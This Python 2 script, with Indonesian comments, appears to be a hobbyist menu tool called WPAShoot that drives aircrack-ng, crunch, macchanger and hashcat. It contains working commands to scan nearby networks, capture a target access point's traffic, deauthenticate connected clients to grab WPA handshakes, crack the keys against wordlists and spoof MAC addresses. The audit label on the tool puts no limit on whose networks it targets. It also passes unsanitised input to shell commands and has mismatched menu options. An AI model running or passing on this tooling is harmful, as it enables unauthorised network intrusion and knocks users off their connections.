#!/usr/bin/python
# wpa-shoot
#WPAShoot Adalah Tools Untuk Audit Keamanan Jaringan Wireless Yang Berbasis aircrack-ng suite
#Jika Anda Ingin Mengedit Source Code Tolong Sertakan Nama Code Writernya.
#
#Version: 1.0 Beta
#Code Writer: HardGhost
#Web Page : Hardghost-sec.blogspot.com
#
#Jika Terjadi Error Pada File WPAShot.py Silahkan Eksekusi File bernama wpashot2.py.
#
#Required Tools:
#-Aircrack-ng
#-Leafpad
#-macchanger
#-crunch
#-xterm
#
#Copyright HardGhostID

import os.path
import os
import subprocess
import time

os.system('clear')
def check():
 print "Checking required tools:"
 path = '/usr/bin/aircrack-ng'
 if os.path.exists(path): 
  time.sleep(0.5)
  print "aircrack-ng [OK]"
  time.sleep(0.1)
 else:
  print "Aircrack-ng [NOT INSTALLED] Please Install aircrack-ng"
  exit()

def check2():
 path = '/usr/bin/leafpad'
 if os.path.exists(path):
  print "Leafpad [OK]"
  time.sleep(0.1)
 else:
  print "Leafpad [NOT INSTALLED] Please Install Leafpad"
  exit()

def check3():
 path = '/usr/bin/crunch'
 if os.path.exists(path):
  print "Crunch [OK]"
 else:
  print "Crunch [NOT INSATLLED] Please Install Crunch"
  exit()

def check4():
 path = '/usr/bin/macchanger'
 if os.path.exists(path):
   print "macchanger [OK]"
 else:
  print "macchanger [NOT INSTALLED] Please Install Macchanger"
def check5():
 path = '/usr/bin/xterm'
 if os.path.exists(path):
  print "xterm [OK]"
 else:
  print "xterm NOT INSTALLED] Please Install xterm"
def check6():
 path = '/usr/bin/hashcat'
 if os.path.exists(path):
  print "Hashcat [OK]"
 else:
  print "Hashcat [NOT INSTALLED] Please Install Hashcat"

check()
check2()
check3()
check4()
check5()
check6()

time.sleep(1.5)

os.system("clear")

def opening():
 os.system("clear")
print  "           __        ______   _    ____  _           _   "   
time.sleep(0.1)
print  "           \ \      / /  _ \ / \  / ___|| |__   ___ | |_ "
time.sleep(0.1)
print  "            \ \ /\ / /| |_) / _ \ \___ \| '_ \ / _ \| __|"
time.sleep(0.1)
print  "             \ V  V / |  __/ ___ \ ___) | | | | (_) | |_ "
time.sleep(0.1)
print  "              \_/\_/  |_| /_/   \_\____/|_| |_|\___/ \__|"


print
time.sleep(1)
print'		            Version 1.0 Beta'
time.sleep(1)
print '		   Bug Report hardghostalkori@gmail.com'

time.sleep(3)
def menu() :
 os.system("clear")
 print "  __        ______   _    ____  _           _   "
 print "  \ \      / /  _ \ / \  / ___|| |__   ___ | |_ "
 print "   \ \ /\ / /| |_) / _ \ \___ \| '_ \ / _ \| __|"
 print "    \ V  V / |  __/ ___ \ ___) | | | | (_) | |_ "
 print "     \_/\_/  |_| /_/   \_\____/|_| |_|\___/ \__|"

 print
 print "                 Version 1.0 Beta"
 print "          visit: hardghost-sec.blogspot.com"
 print "        Bug Report hardghostalkori@gmail.com"
 print
 print " 1.Activate Mode Monitor"
 print " 2.Check Monitor Interfaces"
 print " 3.Test Wireless Adapter Packet Injection"
 print " 4.Scan Wireless Network"
 print " 5.Capture Packet Specific by Target Acces Point"
 print " 6.Capture Handshake or WPA Encryption"
 print " 7.Crack WPA Encrytion!"
 print " 8.Crack WPA Encryption! [HASHCAT]"
 print " 9.Restart Service NetworkManager And Networking"
 print "               ----EXTRAS----"
 print " 99.Create Wordlist [Crunch]"
 print " 88.Change Mac Address"
 print " 77.Create Hashcat Capture File"
 print " 00.Exit"

def pilih():
 print
 time.sleep(0.1)
 pilih = input("WPAShot> ")
 os.system("clear")
 if pilih == 1:
  monitor()
 elif pilih == 2:
  interface()
 elif pilih == 3:
  inject()
 elif pilih == 4:
  scan()
 elif pilih == 5:
  capture()
 elif pilih == 6:
  handshake()
 elif pilih == 7:
  wpa()
 elif pilih == 00:
  exit()
 elif pilih == 8:
  restart()
 elif pilih == 99:
  extra()
 elif pilih == 88:
  mac()
 elif pilih == 77:
  hashcat_capture()
 else:
  print ("Pilihan Tidak Ada Di Menu!")
os.system("clear")

def interface():
 pid =subprocess.Popen(args=["xterm","-hold","-e","airmon-ng"])

def restart():
 print ("Restarting Service Networking...")
 os.system ("service networking restart")
 print ("Restarting Service Network Manager...")
 os.system("service NetworkManager restart")
 print ("Removing Wireless Monitor Interface...")
 os.system("airmon-ng stop mon0")

def monitor():
 os.system("xterm -e airmon-ng check kill")
 os.system("xterm -e airmon-ng start wlan0")
 os.system("clear")
 menu()

def inject():
 print "Berfungsi Untuk Testing Adapter Apakah Support Injection Atau Tidak"
 print
 interface=raw_input ("input your wireless monitor interface mon0/wlan0mon: ")
 pid2 = subprocess.Popen(args=["xterm","-e","airodump-ng",interface])
 time.sleep(1)
 pid = subprocess.Popen(args=["xterm","-hold","-e","aireplay-ng --test "+interface])
 os.system("clear")
 menu()

def scan():
 print "Berfungsi Untuk Scan Jaringan Wifi Di sekitar"
 print
 interface=raw_input("input your wireless monitor interface mon0/wlan0mon: ")
 pid = subprocess.Popen(args=["xterm","-e","airodump-ng "+interface])
 subprocess.Popen(args=["leafpad"])
 os.system("clear")
 menu()
 print "type ctrl+c when done"

def capture():
 print "Berfungsi Untuk Memonitor Acces Point Yang Target Nya sudah di tentukan"
 print
 interface =raw_input ("input your wireless monitor interface mon0/wlan0mon: ")
 channel=raw_input("Target Channel: ")
 bssid=raw_input("BSSID Target:")
 write=raw_input ("Masukan Nama Hasil Capture:")
 pid = subprocess.Popen(args=["xterm","-hold","-e","airodump-ng", "-c" ,channel, "--bssid" ,bssid ,"-w" ,write, interface])
 menu()

def handshake():
 print "Berfungsi Untuk Memutuskan Client Dan Menangkap Informasi User Ke Acces Point Termasuk Enskripsi WPAnya"
 print
 interface=raw_input("input wireless monitor wlan0mon/mon0: ")
 bssid=raw_input("BSSID Target: ")
 client=raw_input("input your client target: ")
 packet=raw_input("JUmlah Paket untuk deauth: ") 
 os.system("xterm -e aireplay-ng --deauth %s -a %s -c %s --ignore-negative-one %s"%(packet,bssid,client,interface))
def wpa():
 print "Untuk Proses Cracking nya"
 wordlist=raw_input("Path Your Wordlist: ")
 capture=raw_input("Your Capture File: ")
 os.system("xterm -hold -e aircrack-ng -w %s %s"%(wordlist,capture))
 menu()

def extra():
 minimum = raw_input("Insert Minimum Wordlist *WPA Minimum 8 : ")
 maximum = raw_input("Insert Maximum Wordlist: ")
 os.system("clear")
 print "lalpha-numeric"
 print "lalpha"
 charset = raw_input("Insert Charset Type:")
 output = raw_input ("Insert Your Output Name: ")
 pid = subprocess.Popen(args=["xterm","-hold","-e","crunch" ,minimum, maximum, "-f", "/usr/share/crunch/charset.lst" ,charset,"-o","/root/"+output])

def mac(): 
 interface = raw_input("Input Your Monitor Interfaces: ")
 subprocess.Popen(args=["ifconfig" ,interface,"down"])
 mac = raw_input("Input Your New Mac Address: ")
 subprocess.Popen(args=["macchanger","-m" ,mac,interface])

def hashcat_capture():
 file = raw_input("Insert Your Capture File: ")
 subprocess.Popen(args=["xterm","-hold","-e","aircrack-ng","-J" ,file])
while menu:
 menu()
 pilih()
